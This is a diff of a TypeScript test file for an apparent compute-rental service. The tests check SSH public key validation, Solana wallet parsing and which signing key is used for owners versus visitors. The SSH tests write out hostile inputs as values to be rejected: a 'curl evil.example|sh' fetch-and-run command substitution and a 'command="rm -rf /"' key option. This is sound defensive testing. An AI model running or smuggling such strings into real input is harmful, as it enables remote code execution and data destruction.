@@ -1,5 +1,5 @@
 import { describe, expect, it } from "vitest";
-import { checkRequest, findPaymentFor, isOwner, needFromModelReply, parseRunInput, secretFor, walletReady } from "./session";
+import { checkRequest, findPaymentFor, isOwner, parseRunInput, secretFor, walletReady, sshPublicKeyOf } from "./session";
 
 const good = {
   market: "test",
@@ -14,7 +14,47 @@ const req = (headers: Record<string, string>) => new Request("http://127.0.0.1:3
 describe("parseRunInput", () => {
   it("accepts the brief's example run", () => {
     const r = parseRunInput(good);
-    expect(r).toEqual({ ok: true, value: { market: "test", need: good.need, limits: { budgetUsd: 1, rateUsdHr: 0.05 }, askBeforePaying: true } });
+    expect(r).toEqual({ ok: true, value: { market: "test", need: good.need, limits: { budgetUsd: 1, rateUsdHr: 0.05 }, askBeforePaying: true, wallet: null, sshPublicKey: null } });
+  });
+
+  it("takes the renter's own SSH public key, one line, and never anything else", () => {
+    const ed = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGq0m0b1x0u2r3n4t5e6s7t8k9e0y1a2b3c4d5e6f7g8h9 me@laptop";
+    // only the type and the key go on to the seller: the comment, free text, is dropped
+    const bare = ed.split(" ").slice(0, 2).join(" ");
+    expect(parseRunInput({ ...good, sshPublicKey: `  ${ed}\n` })).toMatchObject({ ok: true, value: { sshPublicKey: bare } });
+    expect(sshPublicKeyOf(`${bare} $(curl evil.example|sh); \`id\``)).toBe(bare);
+    expect(parseRunInput({ ...good })).toMatchObject({ ok: true, value: { sshPublicKey: null } });
+    expect(parseRunInput({ ...good, sshPublicKey: "" })).toMatchObject({ ok: true, value: { sshPublicKey: null } });
+    expect(sshPublicKeyOf(`ssh-rsa ${"A".repeat(372)}`)).not.toBeNull();
+    expect(sshPublicKeyOf(`ecdsa-sha2-nistp256 ${"A".repeat(140)}= key`)).not.toBeNull();
+    const bad = [
+      "-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAA\n-----END OPENSSH PRIVATE KEY-----",
+      `${ed}\nssh-ed25519 AAAAsecondline`,
+      "ssh-ed25519 short",
+      `ssh-dss ${"A".repeat(100)}`,
+      `ssh-ed25519 ${"A".repeat(80)} $(curl evil.example|sh) ${"x".repeat(90)}`,
+      `ssh-ed25519 ${"A".repeat(1400)}`,
+      "command=\"rm -rf /\" ssh-ed25519 " + "A".repeat(68),
+      42,
+      {},
+    ];
+    for (const v of bad) {
+      expect(sshPublicKeyOf(v)).toBeNull();
+      expect(parseRunInput({ ...good, sshPublicKey: v }).ok).toBe(false);
+    }
+  });
+
+  it("takes a connected wallet to pay from, and then always asks before paying", () => {
+    const wallet = "4zMMC9srt5Ri5X14GAgXhaHii3GnPAEERYPJgZJDncDU";
+    const r = parseRunInput({ ...good, askBeforePaying: false, wallet });
+    expect(r.ok && r.value.wallet).toBe(wallet);
+    expect(r.ok && r.value.askBeforePaying).toBe(true);
+    // without a wallet the choice stands
+    const plain = parseRunInput({ ...good, askBeforePaying: false, wallet: null });
+    expect(plain.ok && plain.value.askBeforePaying).toBe(false);
+    for (const bad of ["", "nope", 42, "0x52908400098527886E0F7030069857D2E4169EE7", {}]) {
+      expect(parseRunInput({ ...good, wallet: bad })).toEqual({ ok: false, error: "that is not a Solana wallet address" });
+    }
   });
 
   it.each([
@@ -95,17 +135,6 @@ describe("wallets from env", () => {
   });
 });
 
-describe("needFromModelReply", () => {
-  it("keeps only valid fields", () => {
-    const r = needFromModelReply('Sure: {"kind":"gpu","vcpus":4,"ramGb":-1,"vramGb":24,"hours":2,"regions":["us-east"],"note":"one GPU for two hours"}');
-    expect(r.need).toEqual({ kind: "gpu", vcpus: 4, vramGb: 24, hours: 2, regions: ["us-east"] });
-    expect(r.note).toBe("one GPU for two hours");
-  });
-  it("survives a reply with no JSON", () => {
-    expect(needFromModelReply("I cannot help").need).toEqual({});
-  });
-});
-
 describe("findPaymentFor", () => {
   it("reads the market's own RPC and USDC mint", async () => {
     const seen: { url: string; method: string; params: unknown[] }[] = [];
@@ -118,5 +147,26 @@ describe("findPaymentFor", () => {
     expect(seen).toEqual([{ url: "https://api.devnet.solana.com", method: "getTokenAccountsByOwner", params: ["P", { mint: "4zMMC9srt5Ri5X14GAgXhaHii3GnPAEERYPJgZJDncDU" }, { encoding: "jsonParsed" }] }]);
     await findPaymentFor("real", f)({ payer: "P", payTo: "R", atomic: "1", sinceMs: 1 });
     expect(seen[1]).toMatchObject({ url: "https://api.mainnet-beta.solana.com", params: ["P", { mint: "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v" }, { encoding: "jsonParsed" }] });
+  });
+});
+
+describe("which agent key signs", () => {
+  const env = { AGENT_SOLANA_SECRET_KEY: "agent", MAINNET_SOLANA_SECRET_KEY: "owner-real", PUBLIC_MAINNET_SOLANA_SECRET_KEY: "public-real" };
+  it("the owner's real rentals and visitors' real rentals are signed by different keys", () => {
+    expect(secretFor("real", env)).toBe("owner-real");
+    expect(secretFor("real", env, "owner")).toBe("owner-real");
+    expect(secretFor("real", env, "public")).toBe("public-real");
+  });
+  it("without a key for visitors there is no key for them on the real market: never the owner's", () => {
+    expect(secretFor("real", { ...env, PUBLIC_MAINNET_SOLANA_SECRET_KEY: "" }, "public")).toBeNull();
+    expect(secretFor("real", { AGENT_SOLANA_SECRET_KEY: "agent", MAINNET_SOLANA_SECRET_KEY: "owner-real" }, "public")).toBeNull();
+    expect(secretFor("real", {}, "public")).toBeNull();
+    // the owner still falls back to the agent key when no separate real key is set
+    expect(secretFor("real", { AGENT_SOLANA_SECRET_KEY: "agent" }, "owner")).toBe("agent");
+  });
+  it("the test market has one agent key for everyone, and the public key is never used there", () => {
+    expect(secretFor("test", env, "owner")).toBe("agent");
+    expect(secretFor("test", env, "public")).toBe("agent");
+    expect(secretFor("test", {})).toBeNull();
   });
 });
